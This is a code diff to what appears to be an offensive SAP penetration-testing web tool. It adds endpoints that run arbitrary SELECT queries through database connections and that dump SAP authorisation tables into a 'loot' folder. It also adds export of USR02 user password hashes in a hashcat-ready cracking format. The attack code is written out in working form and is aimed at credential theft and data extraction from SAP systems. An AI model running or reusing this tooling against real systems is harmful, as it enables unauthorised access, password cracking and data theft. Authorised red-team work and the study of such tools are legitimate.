@@ -13520,7 +13520,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         + (f", target SID={edge.target_sid}"
                            if edge.target_sid else ""),
                         ref="dbcon.probe.sap_shape",
-                        attack_capability="lateral.dbcon_direct")
+                        attack_capability="recon.dbcon_probe")
                 elif edge.reachable:
                     sapmap_findings.emit_finding(
                         "HIGH", sid,
@@ -13528,7 +13528,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"({edge.dbms} {edge.user}@{edge.host}:"
                         f"{edge.port}); direct table read available",
                         ref="dbcon.probe.non_sap",
-                        attack_capability="data.dbcon_dump")
+                        attack_capability="recon.dbcon_probe")
             finally:
                 _task_end(f"{sid}:dbcon_test:{con_name}")
 
@@ -13662,7 +13662,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"{edge.host}:{edge.port} via direct driver "
                         f"(non-SAP data-extraction reach)",
                         ref="dbcon.enum.tables",
-                        attack_capability="data.dbcon_dump")
+                        attack_capability="recon.dbcon_enumerate")
                 else:
                     print(f"[-] {sid}: DBCON {con_name} — enumeration "
                           f"failed: {res.get('error', 'unknown')}")
@@ -13681,15 +13681,23 @@ def create_app(api: SAPMAPApi) -> Bottle:
     @app.route("/api/node/<sid>/dbcon/peek_table", method="POST")
     def node_dbcon_peek_table(sid):
         """Return the top N rows from one enumerated table.  Synchronous
-        (small payload) so the panel can render the result inline."""
+        (small payload) so the panel can render the result inline.
+
+        Accepts optional `where` for filtered recon (bare clause, no
+        WHERE keyword — the probe strips it if included).  The where
+        text is screened for INSERT/UPDATE/DELETE/etc. keywords by
+        the probe layer.
+        """
         response.content_type = "application/json"
         data = request.json or {}
         con_name = (data.get("con_name") or "").strip()
         schema   = (data.get("schema") or "").strip()
         table    = (data.get("table") or "").strip()
+        where    = (data.get("where") or "").strip()
         limit    = int(data.get("limit") or 10)
         print(f"[*] {sid}: DBCON peek_table — con_name={con_name!r} "
-              f"schema={schema!r} table={table!r} limit={limit}")
+              f"schema={schema!r} table={table!r} limit={limit} "
+              f"where={where!r}")
         if not (con_name and schema and table):
             return json.dumps({
                 "error": "con_name, schema, table all required"})
@@ -13702,21 +13710,117 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"error": f"DBCON {con_name!r} not on {sid}"})
         try:
             from sap_dbcon_probe import peek_hana_table
-            res = peek_hana_table(edge, schema, table, limit=limit)
+            res = peek_hana_table(edge, schema, table,
+                                    limit=limit, where=where)
             if res.get("ok") and res.get("rows"):
                 sapmap_findings.emit_finding(
                     "MEDIUM", sid,
                     f"DBCON {con_name} — peeked "
                     f"{schema}.{table} ({len(res['rows'])} row(s)) "
-                    f"via direct driver",
+                    f"via direct driver"
+                    + (f" (WHERE {where})" if where else ""),
                     ref="dbcon.peek.table",
-                    attack_capability="data.dbcon_dump")
+                    attack_capability="data.dbcon_peek")
             return json.dumps(res)
         except Exception as _ex:
             import traceback as _tb
             _tb.print_exc()
             return json.dumps({"error":
                 f"peek crashed: {type(_ex).__name__}: {_ex}"})
+
+    @app.route("/api/node/<sid>/dbcon/custom_sql", method="POST")
+    def node_dbcon_custom_sql(sid):
+        """Run an arbitrary read-only SELECT against the DBCON.
+
+        Blocks write-family keywords at the probe layer — this is
+        strictly for reconnaissance.  Sync so the operator sees
+        results immediately in the overlay."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        sql      = (data.get("sql") or "").strip()
+        limit    = int(data.get("limit") or 200)
+        print(f"[*] {sid}: DBCON custom_sql — con_name={con_name!r} "
+              f"limit={limit} sql={sql[:120]!r}")
+        if not (con_name and sql):
+            return json.dumps({"error": "con_name + sql required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({"error": f"DBCON {con_name!r} not on {sid}"})
+        try:
+            from sap_dbcon_probe import custom_sql_query
+            res = custom_sql_query(edge, sql, limit=limit)
+            if res.get("ok"):
+                sapmap_findings.emit_finding(
+                    "MEDIUM", sid,
+                    f"DBCON {con_name} — custom SELECT returned "
+                    f"{len(res.get('rows', []))} row(s) via direct "
+                    f"driver: {sql[:120]}",
+                    ref="dbcon.custom.sql",
+                    attack_capability="data.dbcon_custom_sql")
+            return json.dumps(res)
+        except Exception as _ex:
+            import traceback as _tb
+            _tb.print_exc()
+            return json.dumps({"error":
+                f"custom SQL crashed: {type(_ex).__name__}: {_ex}"})
+
+    @app.route("/api/node/<sid>/dbcon/dump_auth_tables", method="POST")
+    def node_dbcon_dump_auth_tables(sid):
+        """Dump USR04 + UST04 + USRBF2 to loot/dbcon/auth_*/ for
+        offline "what can user X do" analysis."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        print(f"[*] {sid}: DBCON dump_auth_tables — con_name={con_name!r}")
+        if not con_name:
+            return json.dumps({"error": "con_name required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({"error": f"DBCON {con_name!r} not on {sid}"})
+        if not (edge.reachable and edge.is_sap_shape):
+            return json.dumps({
+                "error": f"DBCON {con_name} must be SAP-shape reachable"})
+
+        def _run():
+            _task_start(f"{sid}:dbcon_auth:{con_name}",
+                        f"DBCON auth dump → {con_name}")
+            try:
+                from sap_dbcon_probe import dump_auth_tables
+                res = dump_auth_tables(edge, source_node=node)
+                if res.get("ok"):
+                    cts = res.get("counts", {})
+                    sapmap_findings.emit_finding(
+                        "HIGH", sid,
+                        f"DBCON {con_name} — auth-table dump: "
+                        f"USR04={cts.get('usr04', 0)}, "
+                        f"UST04={cts.get('ust04', 0)}, "
+                        f"USRBF2={cts.get('usrbf2', 0)} rows "
+                        f"→ {list(res.get('files', {}).values())[0]}",
+                        ref="dbcon.auth.dump",
+                        attack_capability="creds.dbcon_auth_dump")
+                else:
+                    print(f"[-] {sid}: DBCON {con_name} — auth dump: "
+                          f"{res.get('error')}")
+            except Exception as _ex:
+                import traceback as _tb
+                print(f"[!] {sid}: DBCON {con_name} — auth dump "
+                      f"crashed: {type(_ex).__name__}: {_ex}")
+                _tb.print_exc()
+            finally:
+                _task_end(f"{sid}:dbcon_auth:{con_name}")
+
+        _bg(f"{sid}:dbcon_auth:{con_name}",
+             f"DBCON auth dump {con_name}", _run)
+        return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/dbcon/save_peek_csv", method="POST")
     def node_dbcon_save_peek_csv(sid):
@@ -13734,6 +13838,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
         table    = (data.get("table") or "").strip()
         columns  = data.get("columns") or []
         rows     = data.get("rows") or []
+        fmt      = (data.get("format") or "csv").lower().strip()
         if not (con_name and schema and table):
             return json.dumps({
                 "error": "con_name, schema, table required"})
@@ -13749,22 +13854,72 @@ def create_app(api: SAPMAPApi) -> Bottle:
             ts = _dt.utcnow().strftime("%Y%m%d_%H%M%S")
             safe = lambda s: "".join(
                 c if c.isalnum() or c in "-_" else "_" for c in s)
-            path = _os.path.join(
-                loot_dir,
-                f"peek_{safe(schema)}_{safe(table)}_{safe(con_name)}_{ts}.csv")
-            with open(path, "w", newline="") as fh:
-                w = _csv.writer(fh)
-                w.writerow(columns)
-                for r in rows:
-                    w.writerow(["" if v is None else str(v) for v in r])
+
+            if fmt == "hashcat" and table.upper() == "USR02":
+                # Hashcat-format dump.  Match the format
+                # dump_usr02_hashes uses so downstream tooling sees
+                # the same shape whether you dumped the whole table
+                # or just cherry-picked via peek.  Requires the peek
+                # to include BNAME + MANDT + BCODE/PASSCODE/
+                # PWDSALTEDHASH columns.
+                col_idx = {c.upper(): i for i, c in enumerate(columns)}
+                required = ("BNAME", "MANDT")
+                missing = [c for c in required if c not in col_idx]
+                if missing:
+                    return json.dumps({
+                        "error": f"hashcat format needs USR02 columns "
+                                  f"{required}; missing {missing}. "
+                                  f"Peek USR02 with default columns "
+                                  f"(SELECT *) and try again."})
+                path = _os.path.join(
+                    loot_dir,
+                    f"peek_hashcat_{safe(schema)}_{safe(table)}_"
+                    f"{safe(con_name)}_{ts}.txt")
+                bcode_i = col_idx.get("BCODE")
+                pcode_i = col_idx.get("PASSCODE")
+                psalt_i = col_idx.get("PWDSALTEDHASH")
+                with open(path, "w") as fh:
+                    fh.write(
+                        f"# SAPMAP DBCON peek USR02 hashcat dump\n"
+                        f"# Source: {sid} / DBCON {con_name} / "
+                        f"{schema}.{table}\n"
+                        f"# Dumped: {_dt.utcnow().isoformat()}Z\n"
+                        f"# Format: BNAME:MANDT:BCODE:PASSCODE:PWDSALTEDHASH\n"
+                        f"# Rows:   {len(rows)}\n#\n")
+                    for r in rows:
+                        b = r[col_idx["BNAME"]] or ""
+                        m = r[col_idx["MANDT"]] or ""
+                        bc = (r[bcode_i] or "") if bcode_i is not None else ""
+                        pc = (r[pcode_i] or "") if pcode_i is not None else ""
+                        ps = (r[psalt_i] or "") if psalt_i is not None else ""
+                        fh.write(f"{b}:{m}:{bc}:{pc}:{ps}\n")
+            elif fmt == "json":
+                import json as _json
+                path = _os.path.join(
+                    loot_dir,
+                    f"peek_{safe(schema)}_{safe(table)}_"
+                    f"{safe(con_name)}_{ts}.json")
+                with open(path, "w") as fh:
+                    _json.dump({"columns": columns,
+                                 "rows": rows}, fh, indent=2)
+            else:
+                path = _os.path.join(
+                    loot_dir,
+                    f"peek_{safe(schema)}_{safe(table)}_"
+                    f"{safe(con_name)}_{ts}.csv")
+                with open(path, "w", newline="") as fh:
+                    w = _csv.writer(fh)
+                    w.writerow(columns)
+                    for r in rows:
+                        w.writerow(["" if v is None else str(v) for v in r])
             try:
                 _os.chmod(path, 0o600)
             except Exception:
                 pass
-            print(f"[+] {sid}: DBCON peek CSV saved → {path} "
+            print(f"[+] {sid}: DBCON peek {fmt} saved → {path} "
                   f"({len(rows)} rows, {len(columns)} cols)")
             return json.dumps({
-                "ok": True, "loot_path": path,
+                "ok": True, "loot_path": path, "format": fmt,
                 "rows": len(rows), "columns": len(columns)})
         except Exception as _ex:
             import traceback as _tb
@@ -13840,7 +13995,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"{n}/{len(res.get('facts', {}))} queries "
                         f"succeeded",
                         ref="dbcon.recon.sweep",
-                        attack_capability="data.dbcon_dump")
+                        attack_capability="recon.dbcon_hana_sweep")
                 else:
                     print(f"[-] {sid}: DBCON {con_name} — recon: "
                           f"{res.get('error')}")
@@ -13894,7 +14049,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"PWDSALTED={ht.get('pwdsaltedhash', 0)}) — "
                         f"loot: {res.get('loot_path', '')}",
                         ref="dbcon.usr02.dump",
-                        attack_capability="creds.user_password_hash")
+                        attack_capability="creds.dbcon_usr02_dump")
                 else:
                     print(f"[-] {sid}: DBCON {con_name} — USR02 dump: "
                           f"{res.get('error')}")
